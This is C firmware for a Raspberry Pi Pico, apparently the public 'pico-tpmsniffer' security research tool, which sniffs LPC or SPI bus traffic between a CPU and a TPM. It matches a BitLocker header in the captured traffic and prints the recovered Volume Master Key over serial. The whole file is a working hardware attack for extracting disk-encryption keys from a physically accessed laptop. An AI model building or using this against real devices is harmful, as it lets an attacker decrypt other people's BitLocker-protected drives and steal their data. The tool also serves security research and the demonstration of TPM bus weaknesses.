#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "pico/multicore.h"

// Our assembled program:
#include "lpc_sniffer.pio.h"
//#include "spi_sniffer.pio.h"
#include "spi_bios_sniffer.pio.h"

#include "hardware/flash.h"


enum SNIFF_PROTOCOL {
	LPC,
	SPI,
	SPI_BIOS
};

// default to LPC sniffing protocol
enum SNIFF_PROTOCOL sniff_protocol = SPI_BIOS;

unsigned char reverse(unsigned char b) {
   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
   return b;
}

static inline char reverse_nibbles(char c) {
    return ((c<<4) & 0xF0) | ((c >> 4) & 0xFF);
}

static inline uint32_t fix_bit_format(uint32_t input) {
    char a1 = (input >> 24) & 0xFF;
    char a2 = (input >> 16) & 0xFF;
    char a3 = (input >> 8) & 0xFF;
    char a4 = input & 0xFF;
    return (a1 << 24) | (a2 << 16) | (a3 << 8) | a4;
}

enum state {
    STATE_IDLE,
    STATE_READING
};

static inline uint32_t fetch(PIO pio, uint sm) {
    uint32_t result_raw = pio_sm_get_blocking(pio, sm);
    uint32_t result = fix_bit_format(result_raw);
    return result;
}

/*  fetch_spi_message
 *  DI and DO (mosi,miso) are captured simultaneously
 *  1 bit at a time per line. auto pushing in total 16 bits
 *  into the RX-FIFO. So bits 0,2,4 ... 14 are the DO bits
 *  and bits 1,3,5 ... 15 are the DI bits.
 */
static inline uint8_t fetch_spi_message(PIO pio, uint sm) {
    uint64_t mosi_msg=0x0;
    uint64_t miso_msg=0x0;
    uint32_t data;
    bool init = true;
    //printf("[fetch_message] \n");
    while(1)
    {
        char miso_byte = 0x0;
        char mosi_byte = 0x0;
        uint16_t mosi_msk = 0b0100000000000000;
        uint16_t miso_msk = 0b1000000000000000; 
        data = fetch(pio, sm);
        // ### untangle DO and DI parts ####
        for (int i = 0; i < 8 ; i++)
        {   
            miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
            mosi_byte = mosi_byte | ((char) ((data & mosi_msk) >> (7-i))) ;
            miso_msk = miso_msk >> 2;
            mosi_msk = mosi_msk >> 2;
        }
        // #################################

        // keep shifting miso and mosi bytes into 8 byte
        // message storage variables

        if (init) {
            mosi_msg = mosi_msg | mosi_byte;
            miso_msg = miso_msg | miso_byte;    
        }else{
            mosi_msg = (mosi_msg << 8) | mosi_byte;
            miso_msg = (miso_msg << 8) | miso_byte;
        }
        init = false;
        
        // search for fifo_0 read signature 0xD40024
        if (!((mosi_msg & 0x00000000ff00ff00) == 0x00D4002400)) continue;
        
        // return miso result byte
        char message = (char) (miso_msg & 0xff);
        return message;
    }
}


static inline uint32_t fetch_lpc_message(PIO pio, uint sm) {
    while (1) {
        uint32_t result = fetch(pio, sm);
        // Only act on 0b0101 header (TPM comms)
        if((result & 0xF0000000) != 0x50000000) {
            continue;
        }

        // Detect if read or write
        bool is_write = false;
        if((result & 0x02000000) == 0x02000000) {
            is_write = true;
        } else if((result & 0x0F000000) != 0) {
            continue;
        }

        // Extract address
        uint16_t address = (result >> 8) & 0xFFFF;
        
        // Writes are easy
        if(is_write) {
            // Data is encoded LSB first, so we reverse these bits
            uint8_t data = reverse_nibbles(result & 0xFF);
            // printf("Write 0x%04X Data 0x%02X\n", address, data & 0xFF);
            // ignore the next data part
            fetch(pio, sm);
            return 0x02000000 | address << 8 | data;
        } else {
            // Reads are more involved
            // First we skip the tar (1 byte/2 cycles), so we just start at the next result byte
            // next we iterate over the sync til it's 0.
            uint32_t result2 = fetch(pio, sm);
            

            // Start by iterating over the sync bit. We wait til this is 0
            unsigned int i;
            // printf("Result: %08X\n", result2);
            for(i = 7; i > 1; i--) {
                // printf("%08X %d\n", (result2 >> (i*4)) & 0xF, i);
                if(((result2 >> (i*4)) & 0xF) == 0x0) {
                    // Sync done
                    break;
                }
            }
            
            // i is 1 here, even when result 2 is 0xF0001FFF
        
            uint8_t data = reverse_nibbles((result2 >> ((i-2)*4)) & 0xFF );
            return address << 8 | data;
        }
    }
}

static const char vmk_header[] = {
    0x2c, 0x00, 0x05, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
    //0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
};

#define MAXCOUNT 512
uint32_t buf[MAXCOUNT];


char message_buffer[4096*2];
volatile size_t msg_buffer_ptr = 0;

static inline void fetch_lpc(PIO pio, uint sm)
{
    while(1) {
        uint32_t message = fetch_lpc_message(pio, sm);
        // It's a read of the right address
        if((message & 0x0f00ff00) == 0x00002400) {
            char message_char = message & 0xff;
            message_buffer[msg_buffer_ptr++] = message_char;

            if(message_char == 0x2c) {
                multicore_fifo_push_blocking(msg_buffer_ptr);
            }
        }
    }
}

static inline void fetch_spi_bios(PIO pio, uint sm)
{
    printf("[SPI protocol selection]\n");
    while(1) {
        char message = fetch_spi_message(pio, sm);
	    if (!(message == 0x2c)) continue;
	    message_buffer[msg_buffer_ptr++] = message;
        multicore_fifo_push_blocking(msg_buffer_ptr);
	    for (int i = 0; i < 44; i++){
	        message_buffer[msg_buffer_ptr++] = fetch_spi_message(pio, sm);
	    }
	}
}


void core1_entry() 
{
    PIO pio = pio0;
    uint offset ;
    uint sm;

    switch (sniff_protocol){
        case LPC:
    	    offset = pio_add_program(pio, &lpc_sniffer_program);
            sm = pio_claim_unused_sm(pio, true);
            lpc_sniffer_program_init(pio, sm, offset, 1, 10);
            fetch_lpc(pio, sm);
	    break;
	    case SPI_BIOS:
	        offset = pio_add_program(pio, &spi_bios_sniffer_program);
	        sm = pio_claim_unused_sm(pio, true);
	        spi_bios_sniffer_program_init(pio, sm, offset, 2, 5);
            fetch_spi_bios(pio, sm);
	        break;
	    default:
	        offset = pio_add_program(pio, &spi_bios_sniffer_program);
	        sm = pio_claim_unused_sm(pio, true);
	        spi_bios_sniffer_program_init(pio, sm, offset, 2, 5);
	        fetch_spi_bios(pio, sm);
	        break;
	}
}

int main() {
    /* havent decided yet on how to select the sniff_protocol
     * could setup a python script with the option to select
     * the protocol of choice and output the serial data. This
     * would also allow to directly save the captured key to a
     * file.
     */
    set_sys_clock_khz(270000, true); // 158us
    stdio_init_all();
    
    sleep_ms(5000);

    puts(" _           ");
    puts("|_) o  _  _  ");
    puts("|   | (_ (_) ");
    puts("");
    puts("88P'888'Y88 888 88e    e   e        dP\"8         ,e,  dP,e,  dP,e,                ");
    puts("P'  888  'Y 888 888D  d8b d8b      C8b Y 888 8e   \"   8b \"   8b \"   ,e e,  888,8, ");
    puts("    888     888 88\"  e Y8b Y8b      Y8b  888 88b 888 888888 888888 d88 88b 888 \"  ");
    puts("    888     888     d8b Y8b Y8b    b Y8D 888 888 888  888    888   888   , 888    ");
    puts("    888     888    d888b Y8b Y8b   8edP  888 888 888  888    888    \"YeeP\" 888    ");
    puts("                                                                 - by stacksmashing");
    puts("");

    printf("[+] Ready to sniff!\n");
    
    multicore_launch_core1(core1_entry);
    
    while(1) {
        uint32_t popped = multicore_fifo_pop_blocking();

        // Wait til the msg_buffer_ptr is full
        while((msg_buffer_ptr - popped) < 44) {
        }
        
        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) 
        {
            printf("[+] Bitlocker Volume Master Key found:\n");

            for(int i=0; i < 2; i++) {
                printf("[+] ");
                for(int j=0; j < 2; j++) {
                    for(int k=0; k < 8; k++) {
                        printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
                    }
                    printf(" ");
                }
                puts("");
            }
        }
    }
}
